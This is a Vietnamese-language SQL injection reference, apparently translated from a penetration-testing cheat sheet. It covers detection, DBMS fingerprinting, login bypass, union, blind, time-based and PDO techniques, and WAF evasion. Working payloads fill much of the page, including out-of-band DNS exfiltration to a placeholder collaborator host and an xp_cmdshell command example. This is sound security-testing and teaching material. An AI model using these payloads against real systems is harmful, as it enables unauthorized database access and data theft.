# SQL Injection

> SQL Injection (SQLi) là một loại lỗ hổng bảo mật cho phép kẻ tấn công can thiệp vào các câu truy vấn mà một ứng dụng gửi đến cơ sở dữ liệu của nó. SQL Injection là một trong những loại lỗ hổng ứng dụng web phổ biến và nghiêm trọng nhất, cho phép kẻ tấn công thực thi mã SQL tùy ý trên cơ sở dữ liệu. Điều này có thể dẫn đến truy cập dữ liệu trái phép, thao túng dữ liệu, và trong một số trường hợp, chiếm quyền kiểm soát hoàn toàn máy chủ cơ sở dữ liệu.

## Tóm tắt

* [CheatSheets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/)
    * [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
    * [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
    * [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
    * [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
    * [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
    * [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
    * [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
    * [SQLmap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap.md)
* [Công cụ](#tools)
* [Phát hiện điểm chèn (Entry Point)](#entry-point-detection)
* [Nhận diện DBMS](#dbms-identification)
* [Vượt qua xác thực](#authentication-bypass)
    * [MD5 và SHA1 dạng thô (Raw)](#raw-md5-and-sha1)
* [Khai thác dựa trên UNION](#union-based-injection)
* [Khai thác dựa trên lỗi](#error-based-injection)
* [Khai thác dạng mù (Blind)](#blind-injection)
    * [Khai thác mù dựa trên Boolean](#boolean-based-injection)
    * [Khai thác mù dựa trên lỗi](#blind-error-based-injection)
    * [Khai thác dựa trên thời gian](#time-based-injection)
    * [Out of Band (OAST)](#out-of-band-oast)
* [Khai thác dựa trên Stacked Query](#stacked-based-injection)
* [Khai thác dạng Polyglot](#polyglot-injection)
* [Khai thác dạng Routed](#routed-injection)
* [SQL Injection bậc hai (Second Order)](#second-order-sql-injection)
* [PDO Prepared Statements](#pdo-prepared-statements)
* [Vượt qua WAF tổng quát](#generic-waf-bypass)
    * [Không cho phép khoảng trắng](#no-space-allowed)
    * [Không cho phép dấu phẩy](#no-comma-allowed)
    * [Không cho phép dấu bằng](#no-equal-allowed)
    * [Thay đổi kiểu chữ (Case Modification)](#case-modification)
* [Bài Lab](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Công cụ tự động phát hiện SQL injection và chiếm quyền cơ sở dữ liệu
* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - Một công cụ nâng cao, đa nền tảng tự động hóa quá trình phát hiện và khai thác các lỗ hổng bảo mật SQL injection

## Phát hiện điểm chèn (Entry Point)

Việc phát hiện điểm chèn trong SQL injection (SQLi) liên quan đến việc xác định các vị trí trong ứng dụng nơi dữ liệu đầu vào của người dùng không được kiểm tra, làm sạch đúng cách trước khi được đưa vào các câu truy vấn SQL.

* **Thông báo lỗi**: Nhập các ký tự đặc biệt (ví dụ: dấu nháy đơn ') vào các trường đầu vào có thể kích hoạt lỗi SQL. Nếu ứng dụng hiển thị thông báo lỗi chi tiết, đó có thể là dấu hiệu của một điểm SQL injection tiềm ẩn.
    * Ký tự đơn giản: `'`, `"`, `;`, `)` và `*`
    * Ký tự đơn giản được mã hóa: `%27`, `%22`, `%23`, `%3B`, `%29` và `%2A`
    * Mã hóa nhiều lớp: `%%2727`, `%25%27`
    * Ký tự Unicode: `U+02BA`, `U+02B9`
        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` mã hóa thành `%CA%BA`) được chuyển đổi thành `U+0022` QUOTATION MARK (`)
        * MODIFIER LETTER PRIME (`U+02B9` mã hóa thành `%CA%B9`) được chuyển đổi thành `U+0027` APOSTROPHE (')

* **SQL Injection dựa trên hằng đúng (Tautology)**: Bằng cách nhập các điều kiện luôn đúng (tautological), bạn có thể kiểm tra các lỗ hổng. Ví dụ, nhập `admin' OR '1'='1` vào trường tên đăng nhập có thể giúp bạn đăng nhập như admin nếu hệ thống dễ bị tấn công.
    * Nối chuỗi ký tự

      ```sql
      `+HERP
      '||'DERP
      '+'herp
      ' 'DERP
      '%20'HERP
      '%2B'HERP
      ```

    * Kiểm tra logic

      ```sql
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
      ```

* **Tấn công dựa trên thời gian (Timing Attacks)**: Nhập các lệnh SQL gây ra độ trễ có chủ ý (ví dụ: dùng các hàm `SLEEP` hoặc `BENCHMARK` trong MySQL) có thể giúp xác định các điểm chèn tiềm ẩn. Nếu ứng dụng mất một khoảng thời gian bất thường để phản hồi sau dữ liệu đầu vào đó, nó có thể dễ bị tấn công.

## Nhận diện DBMS

### Nhận diện DBMS dựa trên từ khóa

Một số từ khóa SQL nhất định là đặc thù cho các hệ quản trị cơ sở dữ liệu (DBMS) cụ thể. Bằng cách sử dụng các từ khóa này trong các lần thử SQL injection và quan sát cách trang web phản hồi, bạn thường có thể xác định được loại DBMS đang được sử dụng.

| DBMS       | Payload SQL                                       |
| ---------- | ------------------------------------------------- |
| MySQL      | `conv('a',16,2)=conv('a',16,2)`                   |
| MySQL      | `connection_id()=connection_id()`                 |
| MySQL      | `crc32('MySQL')=crc32('MySQL')`                   |
| MSSQL      | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`       |
| MSSQL      | `@@CONNECTIONS>0`                                 |
| MSSQL      | `@@CONNECTIONS=@@CONNECTIONS`                     |
| MSSQL      | `@@CPU_BUSY=@@CPU_BUSY`                           |
| MSSQL      | `USER_ID(1)=USER_ID(1)`                           |
| ORACLE     | `ROWNUM=ROWNUM`                                   |
| ORACLE     | `RAWTOHEX('AB')=RAWTOHEX('AB')`                   |
| ORACLE     | `LNNVL(0=123)`                                    |
| POSTGRESQL | `5::int=5`                                        |
| POSTGRESQL | `5::integer=5`                                    |
| POSTGRESQL | `pg_client_encoding()=pg_client_encoding()`       |
| POSTGRESQL | `get_current_ts_config()=get_current_ts_config()` |
| POSTGRESQL | `quote_literal(42.5)=quote_literal(42.5)`         |
| POSTGRESQL | `current_database()=current_database()`           |
| SQLITE     | `sqlite_version()=sqlite_version()`               |
| SQLITE     | `last_insert_rowid()>1`                           |
| SQLITE     | `last_insert_rowid()=last_insert_rowid()`         |
| MSACCESS   | `val(cvar(1))=1`                                  |
| MSACCESS   | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0`               |

### Nhận diện DBMS dựa trên lỗi

Các DBMS khác nhau trả về các thông báo lỗi khác biệt khi gặp sự cố. Bằng cách kích hoạt lỗi và kiểm tra các thông báo cụ thể được cơ sở dữ liệu gửi về, bạn thường có thể xác định được loại DBMS mà trang web đang sử dụng.

| DBMS                 | Thông báo lỗi ví dụ                                                                     | Payload ví dụ |
| -------------------- | ----------------------------------------------------------------------------------------- | --------------- |
| MySQL                | `You have an error in your SQL syntax; ... near '' at line 1`                             | `'`             |
| PostgreSQL           | `ERROR: unterminated quoted string at or near "'"`                                        | `'`             |
| PostgreSQL           | `ERROR: syntax error at or near "1"`                                                      | `1'`            |
| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.`                                  | `'`             |
| Microsoft SQL Server | `Incorrect syntax near ''.`                                                               | `'`             |
| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'`            |
| Oracle               | `ORA-00933: SQL command not properly ended`                                               | `'`             |
| Oracle               | `ORA-01756: quoted string not properly terminated`                                        | `'`             |
| Oracle               | `ORA-00923: FROM keyword not found where expected`                                        | `1'`            |

## Vượt qua xác thực

Trong một cơ chế xác thực tiêu chuẩn, người dùng cung cấp tên đăng nhập và mật khẩu. Ứng dụng thường kiểm tra các thông tin xác thực này với cơ sở dữ liệu. Ví dụ, một câu truy vấn SQL có thể trông giống như sau:

```SQL
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

Kẻ tấn công có thể cố gắng chèn mã SQL độc hại vào trường tên đăng nhập hoặc mật khẩu. Ví dụ, nếu kẻ tấn công nhập nội dung sau vào trường tên đăng nhập:

```sql
' OR '1'='1'--
```

Payload này chèn một câu điều kiện luôn đúng vào trường tên đăng nhập và chú thích phần còn lại của câu truy vấn SQL.
Kẻ tấn công có thể viết bất cứ điều gì vào trường mật khẩu vì câu truy vấn SQL kết quả sẽ không còn kiểm tra nó nữa.

```SQL
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```

Ở đây, `'1'='1'` luôn đúng, có nghĩa là câu truy vấn có thể trả về một người dùng hợp lệ, từ đó vượt qua kiểm tra xác thực một cách hiệu quả.

:warning: Trong trường hợp này, cơ sở dữ liệu sẽ trả về một mảng kết quả vì nó sẽ khớp với mọi người dùng trong bảng. Điều này sẽ gây ra lỗi ở phía máy chủ vì nó chỉ mong đợi một kết quả duy nhất. Bằng cách thêm mệnh đề `LIMIT`, bạn có thể giới hạn số dòng được trả về bởi câu truy vấn.

Bằng cách gửi payload sau vào trường tên đăng nhập, bạn sẽ đăng nhập như người dùng đầu tiên trong cơ sở dữ liệu. Ngoài ra, bạn có thể chèn một payload vào trường mật khẩu trong khi sử dụng đúng tên đăng nhập để nhắm vào một người dùng cụ thể.

```sql
' or 1=1 limit 1 --
```

:warning: Tránh sử dụng payload này một cách bừa bãi, vì nó luôn trả về đúng. Nó có thể tương tác với các endpoint có thể vô tình xóa các phiên (session), tập tin, cấu hình, hoặc dữ liệu cơ sở dữ liệu.

* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

### MD5 và SHA1 dạng thô (Raw)

Trong PHP, nếu tham số tùy chọn `binary` được đặt thành true, thì kết quả tổng hợp `md5` sẽ được trả về ở định dạng nhị phân thô với độ dài 16. Hãy xem đoạn mã PHP sau, nơi việc xác thực đang kiểm tra hash MD5 của mật khẩu do người dùng gửi lên.

```php
sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

Kẻ tấn công có thể tạo ra một payload sao cho kết quả của hàm `md5($password,true)` sẽ chứa một dấu nháy và thoát khỏi ngữ cảnh SQL, ví dụ với `' or 'SOMETHING`.

| Hash | Đầu vào                                   | Đầu ra (Thô)            | Payload |
| ---- | --------------------------------------- | ----------------------- | ------- |
| md5  | ffifdyop                                | `'or'6�]��!r,��b`       | `'or'`  |
| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8`         | `'or'`  |
| sha1 | 3fDf                                    | `Q�u'='�@�[�t�- o��_-!` | `'='`   |
| sha1 | 178374                                  | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`   |
| sha1 | 17                                      | `Ùp2ûjww%6\`            | `\`     |

Hành vi này có thể bị lợi dụng để vượt qua xác thực bằng cách thoát khỏi ngữ cảnh.

```php
sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
```

### Mật khẩu đã được băm (Hashed Passwords)

Tính đến năm 2025, các ứng dụng hầu như không còn lưu trữ mật khẩu dạng văn bản thuần (plaintext) nữa. Thay vào đó, các hệ thống xác thực sử dụng một dạng biểu diễn của mật khẩu (một hash được tạo ra bởi hàm dẫn xuất khóa, thường kèm theo salt). Sự phát triển đó làm thay đổi cơ chế của một số cách vượt qua SQL injection (SQLi) truyền thống: kẻ tấn công chèn dòng thông qua `UNION` giờ đây phải cung cấp các giá trị khớp với dạng biểu diễn được lưu trữ mà ứng dụng mong đợi, chứ không phải mật khẩu gốc của người dùng.

Nhiều luồng xác thực đơn giản thực hiện các bước cấp cao sau:

* Truy vấn cơ sở dữ liệu để lấy bản ghi người dùng (ví dụ: `SELECT username, password_hash FROM users WHERE username = ?`).
* Nhận `password_hash` được lưu trữ từ DB.
* Tính toán cục bộ `hash(input_password)` bằng thuật toán nào đó đã được cấu hình.
* So sánh `stored_password_hash == hash(input_password)`.

Nếu kẻ tấn công có thể chèn thêm một dòng vào tập kết quả (ví dụ sử dụng `UNION`), họ có thể khiến ứng dụng nhận một `stored_password_hash` do kẻ tấn công kiểm soát. Nếu hash được chèn vào đó bằng với `hash(attacker_supplied_password)` được ứng dụng tính toán, thì phép so sánh sẽ thành công và kẻ tấn công sẽ được xác thực với tên người dùng đã chèn.

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--
```

* `AND 1=0`: để buộc yêu cầu trở thành sai.
* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: chọn số lượng cột cần thiết, ở đây 161ebd7d45089b3446ee4e0d86dbcf92 tương ứng với `MD5("P@ssw0rd")`.

Nếu ứng dụng tính toán `MD5("P@ssw0rd")` và kết quả bằng `161ebd7d45089b3446ee4e0d86dbcf92`, thì việc nhập `"P@ssw0rd"` làm mật khẩu đăng nhập sẽ vượt qua kiểm tra.

Phương pháp này sẽ thất bại nếu ứng dụng lưu trữ `salt` và `KDF(salt, password)`. Một hash tĩnh duy nhất được chèn vào không thể khớp với kết quả đã được salt riêng cho từng người dùng trừ khi kẻ tấn công cũng biết hoặc kiểm soát được salt và các tham số KDF.

## Khai thác dựa trên UNION

Trong một câu truy vấn SQL tiêu chuẩn, dữ liệu được lấy từ một bảng. Toán tử `UNION` cho phép kết hợp nhiều câu lệnh `SELECT`. Nếu một ứng dụng dễ bị tấn công SQL injection, kẻ tấn công có thể chèn một câu truy vấn SQL được tạo sẵn để nối thêm một câu lệnh `UNION` vào câu truy vấn gốc.

Giả sử một ứng dụng web dễ bị tấn công lấy chi tiết sản phẩm dựa trên ID sản phẩm từ một cơ sở dữ liệu:

```sql
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
```

Kẻ tấn công có thể sửa đổi `input_id` để bao gồm dữ liệu từ một bảng khác như `users`.

```SQL
1' UNION SELECT username, password FROM users --
```

Sau khi gửi payload của chúng ta, câu truy vấn trở thành SQL sau:

```SQL
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
```

:warning: 2 mệnh đề SELECT phải có cùng số lượng cột.

## Khai thác dựa trên lỗi

SQL Injection dựa trên lỗi (Error-Based) là một kỹ thuật dựa vào các thông báo lỗi được trả về từ cơ sở dữ liệu để thu thập thông tin về cấu trúc cơ sở dữ liệu. Bằng cách thao túng các tham số đầu vào của một câu truy vấn SQL, kẻ tấn công có thể khiến cơ sở dữ liệu tạo ra các thông báo lỗi. Các lỗi này có thể tiết lộ những chi tiết quan trọng về cơ sở dữ liệu, chẳng hạn như tên bảng, tên cột, và kiểu dữ liệu, có thể được dùng để tạo ra các cuộc tấn công tiếp theo.

Ví dụ, trên PostgreSQL, việc chèn payload này vào một câu truy vấn SQL sẽ dẫn đến lỗi vì mệnh đề LIMIT đang mong đợi một giá trị số.

```sql
LIMIT CAST((SELECT version()) as numeric) 
```

Lỗi này sẽ rò rỉ kết quả đầu ra của `version()`.

```ps1
ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
```

## Khai thác dạng mù (Blind)

SQL Injection dạng mù (Blind) là một loại tấn công SQL Injection đặt các câu hỏi đúng/sai cho cơ sở dữ liệu và xác định câu trả lời dựa trên phản hồi của ứng dụng.

### Khai thác mù dựa trên Boolean

Các cuộc tấn công dựa vào việc gửi một câu truy vấn SQL đến cơ sở dữ liệu, khiến ứng dụng trả về kết quả khác nhau tùy thuộc vào việc câu truy vấn trả về TRUE hay FALSE. Kẻ tấn công có thể suy luận thông tin dựa trên sự khác biệt trong hành vi của ứng dụng.

Kích thước của trang, mã phản hồi HTTP, hoặc các phần bị thiếu của trang là những chỉ báo mạnh mẽ để phát hiện xem cuộc tấn công Boolean-based Blind SQL injection có thành công hay không.

Đây là một ví dụ đơn giản để khôi phục nội dung của biến `@@hostname`.

**Xác định điểm chèn và xác nhận lỗ hổng**: Chèn một payload đánh giá thành đúng/sai để xác nhận lỗ hổng SQL injection. Ví dụ:

```ps1
http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
```

**Trích xuất độ dài hostname**: Đoán độ dài của hostname bằng cách tăng dần cho đến khi phản hồi cho thấy sự khớp. Ví dụ:

```ps1
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
```

**Trích xuất các ký tự của hostname**: Trích xuất từng ký tự của hostname bằng cách dùng substring và so sánh mã ASCII:

```ps1
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
```

Sau đó lặp lại phương pháp này để khám phá từng ký tự của `@@hostname`. Rõ ràng ví dụ này không phải là cách nhanh nhất để lấy được chúng. Dưới đây là một vài gợi ý để tăng tốc:

* Trích xuất ký tự bằng phương pháp phân đôi (dichotomy): nó giảm số lượng request từ tuyến tính xuống thời gian logarit, giúp việc trích xuất dữ liệu hiệu quả hơn nhiều.

### Khai thác mù dựa trên lỗi

Các cuộc tấn công dựa vào việc gửi một câu truy vấn SQL đến cơ sở dữ liệu, khiến ứng dụng trả về kết quả khác nhau tùy thuộc vào việc câu truy vấn thực thi thành công hay gây ra lỗi. Trong trường hợp này, ta chỉ suy luận sự thành công từ phản hồi của máy chủ, nhưng dữ liệu không được trích xuất từ đầu ra của lỗi.

**Ví dụ**: Dùng hàm `json()` trong SQLite để kích hoạt một lỗi như một "oracle" để biết khi nào injection là đúng hay sai.

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```

### Khai thác dựa trên thời gian

SQL Injection dựa trên thời gian là một loại tấn công blind SQL Injection dựa vào độ trễ của cơ sở dữ liệu để suy luận xem một số câu truy vấn nhất định trả về đúng hay sai. Nó được dùng khi một ứng dụng không hiển thị bất kỳ phản hồi trực tiếp nào từ các câu truy vấn cơ sở dữ liệu nhưng cho phép thực thi các lệnh SQL bị trì hoãn theo thời gian. Kẻ tấn công có thể phân tích thời gian mà cơ sở dữ liệu mất để phản hồi nhằm gián tiếp thu thập thông tin từ cơ sở dữ liệu.

* Hàm `SLEEP` mặc định của cơ sở dữ liệu

```sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```

* Các truy vấn nặng mất nhiều thời gian để hoàn thành, thường là các hàm mã hóa.

```sql
BENCHMARK(2000000,MD5(NOW()))
```

Hãy xem một ví dụ cơ bản để khôi phục phiên bản của cơ sở dữ liệu bằng cách sử dụng SQL injection dựa trên thời gian.

```sql
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```

Nếu phản hồi của máy chủ mất vài giây trước khi nhận được, thì phiên bản đang bắt đầu bằng '5'.

### Out of Band (OAST)

SQL Injection dạng Out-of-Band (OOB SQLi) xảy ra khi kẻ tấn công sử dụng các kênh giao tiếp thay thế để trích xuất dữ liệu từ một cơ sở dữ liệu. Không giống như các kỹ thuật SQL injection truyền thống dựa vào phản hồi ngay lập tức trong phản hồi HTTP, SQL injection dạng OOB phụ thuộc vào khả năng của máy chủ cơ sở dữ liệu thực hiện các kết nối mạng đến một máy chủ do kẻ tấn công kiểm soát. Phương pháp này đặc biệt hữu ích khi kết quả của lệnh SQL được chèn vào không thể xem trực tiếp hoặc phản hồi của máy chủ không ổn định hoặc không đáng tin cậy.

Các cơ sở dữ liệu khác nhau cung cấp nhiều phương pháp khác nhau để tạo các kết nối out-of-band, kỹ thuật phổ biến nhất là trích xuất dữ liệu qua DNS:

* MySQL

  ```sql
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
  ```

* MSSQL

  ```sql
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
  ```

## Khai thác dựa trên Stacked Query

SQL Injection dạng Stacked Queries là một kỹ thuật trong đó nhiều câu lệnh SQL được thực thi trong một câu truy vấn duy nhất, được phân tách bằng một dấu phân cách như dấu chấm phẩy (`;`). Điều này cho phép kẻ tấn công thực thi thêm các lệnh SQL độc hại theo sau một câu truy vấn hợp lệ. Không phải tất cả các cơ sở dữ liệu hoặc cấu hình ứng dụng đều hỗ trợ stacked queries.

```sql
1; EXEC xp_cmdshell('whoami') --
```

## Khai thác dạng Polyglot

Một payload SQL injection dạng polyglot là một chuỗi tấn công SQL injection được tạo ra đặc biệt, có thể thực thi thành công trong nhiều ngữ cảnh hoặc môi trường khác nhau mà không cần chỉnh sửa. Điều này có nghĩa là payload có thể vượt qua các loại kiểm tra, phân tích cú pháp, hoặc logic thực thi khác nhau trong một ứng dụng web hoặc cơ sở dữ liệu bằng cách là SQL hợp lệ trong nhiều tình huống khác nhau.

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Khai thác dạng Routed

> SQL injection dạng routed là tình huống trong đó câu truy vấn có thể bị chèn injection không phải là câu truy vấn đưa ra kết quả đầu ra, mà kết quả của câu truy vấn bị chèn đó lại đi vào câu truy vấn đưa ra kết quả đầu ra. - Zenodermus Javanicus

Nói ngắn gọn, kết quả của câu truy vấn SQL đầu tiên được dùng để xây dựng câu truy vấn SQL thứ hai. Định dạng thông thường là `' union select 0xHEXVALUE --` trong đó HEX là SQL injection cho câu truy vấn thứ hai.

**Ví dụ 1**:

`0x2720756e696f6e2073656c65637420312c3223` là mã hex của `' union select 1,2#`

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

**Ví dụ 2**:

`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` là mã hex của `-1' union select login,password from users-- a`.

```sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

## SQL Injection bậc hai (Second Order)

SQL Injection bậc hai (Second Order) là một dạng phụ của SQL injection, trong đó payload SQL độc hại chủ yếu được lưu trữ trong cơ sở dữ liệu của ứng dụng và sau đó được thực thi bởi một chức năng khác của cùng ứng dụng đó.
Không giống như SQLi bậc một (first-order), việc chèn injection không xảy ra ngay lập tức. Nó được **kích hoạt trong một bước riêng biệt**, thường ở một phần khác của ứng dụng.

1. Người dùng gửi dữ liệu đầu vào được lưu trữ (ví dụ: trong quá trình đăng ký hoặc cập nhật hồ sơ).

   ```text
   Username: attacker'--
   Email: attacker@example.com
   ```

2. Dữ liệu đầu vào đó được lưu **mà không được kiểm tra** nhưng không kích hoạt SQL injection.

   ```sql
   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
   ```

3. Sau đó, ứng dụng lấy và sử dụng dữ liệu đã lưu trữ đó trong một câu truy vấn SQL.

   ```python
   query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
   ```

4. Nếu câu truy vấn này được xây dựng không an toàn, việc chèn injection sẽ được kích hoạt.

## PDO Prepared Statements

PDO, hay PHP Data Objects, là một extension dành cho PHP cung cấp một cách nhất quán và an toàn để truy cập và tương tác với các cơ sở dữ liệu. Nó được thiết kế để cung cấp một phương pháp chuẩn hóa cho việc tương tác với cơ sở dữ liệu, cho phép các nhà phát triển sử dụng một API nhất quán trên nhiều loại cơ sở dữ liệu như MySQL, PostgreSQL, SQLite, và nhiều loại khác.

PDO cho phép ràng buộc (binding) các tham số đầu vào, đảm bảo dữ liệu người dùng được làm sạch đúng cách trước khi được thực thi như một phần của câu truy vấn SQL. Tuy nhiên, nó vẫn có thể dễ bị tấn công SQL injection nếu các nhà phát triển cho phép dữ liệu đầu vào của người dùng nằm bên trong câu truy vấn SQL.

**Yêu cầu**:

* DMBS
    * **MySQL** dễ bị tấn công theo mặc định.
    * **Postgres** không dễ bị tấn công theo mặc định, trừ khi tính năng giả lập (emulation) được bật với `PDO::ATTR_EMULATE_PREPARES => true`.
    * **SQLite** không dễ bị tấn công theo kiểu này.

* SQL injection ở bất kỳ đâu bên trong một câu lệnh PDO: `$pdo->prepare("SELECT $INJECT_SQL_HERE...")`.
* PDO được dùng cho một tham số SQL khác, sử dụng `?` hoặc `:parameter`.

    ```php
    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';

    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
    $stmt->execute([$_GET['name']]);
    // or
    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
    $stmt->execute(['name' => $_GET['name']]);
    ```

**Phương pháp**:

**LƯU Ý**: Trong PHP 8.3 trở xuống, việc chèn injection xảy ra ngay cả khi không có byte null (`\0`). Kẻ tấn công chỉ cần lén đưa vào một dấu "`:`" hoặc "`?`".

* Phát hiện SQLi bằng `?#\0`: `GET /index.php?col=%3f%23%00&name=anything`

    ```ps1
    # 1st Payload: ?#\0
    # 2nd Payload: anything
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1
    ```

* Buộc phải select \`'x\` thay vì một tên cột và tạo một chú thích. Chèn một dấu backtick để sửa cột và kết thúc câu truy vấn SQL bằng `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`

    ```ps1
    # 1st Payload: ?#\0
    # 2nd Payload: x`;#
    Column not found: 1054 Unknown column ''x' in 'SELECT'
    ```

* Chèn payload vào tham số thứ hai. `GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523`

    ```ps1
    # 1st Payload: \?#\0
    # 2nd Payload: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
    ALL_PLUGINS
    APPLICABLE_ROLES
    CHARACTER_SETS
    CHECK_CONSTRAINTS
    COLLATIONS
    COLLATION_CHARACTER_SET_APPLICABILITY
    COLUMNS
    ```

* Các câu truy vấn SQL cuối cùng

    ```SQL
    -- Before $pdo->prepare
    SELECT `\?#\0` FROM animals WHERE name = ?

    -- After $pdo->prepare
    SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM animals WHERE name = ?
    ```

## Vượt qua WAF tổng quát

---

### Không cho phép khoảng trắng

Một số ứng dụng web cố gắng bảo mật câu truy vấn SQL của mình bằng cách chặn hoặc loại bỏ các ký tự khoảng trắng để ngăn chặn các cuộc tấn công SQL injection đơn giản. Tuy nhiên, kẻ tấn công có thể vượt qua các bộ lọc này bằng cách sử dụng các ký tự khoảng trắng thay thế, chú thích, hoặc cách dùng dấu ngoặc đơn một cách sáng tạo.

#### Các ký tự khoảng trắng thay thế

Hầu hết các cơ sở dữ liệu diễn giải một số ký tự điều khiển ASCII và khoảng trắng được mã hóa (như tab, xuống dòng, v.v.) như là khoảng trắng trong các câu lệnh SQL. Bằng cách mã hóa các ký tự này, kẻ tấn công thường có thể tránh được các bộ lọc dựa trên khoảng trắng.

| Payload ví dụ             | Mô tả                            |
| -------------------------- | ------------------------------- |
| `?id=1%09and%091=1%09--`  | `%09` là tab (`\t`)              |
| `?id=1%0Aand%0A1=1%0A--`  | `%0A` là line feed (`\n`)        |
| `?id=1%0Band%0B1=1%0B--`  | `%0B` là vertical tab            |
| `?id=1%0Cand%0C1=1%0C--`  | `%0C` là form feed               |
| `?id=1%0Dand%0D1=1%0D--`  | `%0D` là carriage return (`\r`)  |
| `?id=1%A0and%A01=1%A0--`  | `%A0` là non-breaking space      |

**Hỗ trợ ký tự khoảng trắng ASCII theo cơ sở dữ liệu**:

| DBMS       | Các ký tự khoảng trắng được hỗ trợ (Hex)          |
| ---------- | ------------------------------------------------- |
| SQLite3    | 0A, 0D, 0C, 09, 20                                |
| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20                        |
| MySQL 3    | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
| PostgreSQL | 0A, 0D, 0C, 09, 20                                |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20                            |
| MSSQL      | 01–1F, 20                                         |

#### Vượt qua bằng chú thích và dấu ngoặc đơn

SQL cho phép chú thích và nhóm, có thể phá vỡ các từ khóa và câu truy vấn, từ đó đánh bại các bộ lọc khoảng trắng:

| Cách vượt qua                             | Kỹ thuật             |
| ----------------------------------------- | ------------------- |
| `?id=1/*comment*/AND/**/1=1/**/--`        | Chú thích            |
| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Chú thích có điều kiện |
| `?id=(1)and(1)=(1)--`                     | Dấu ngoặc đơn        |

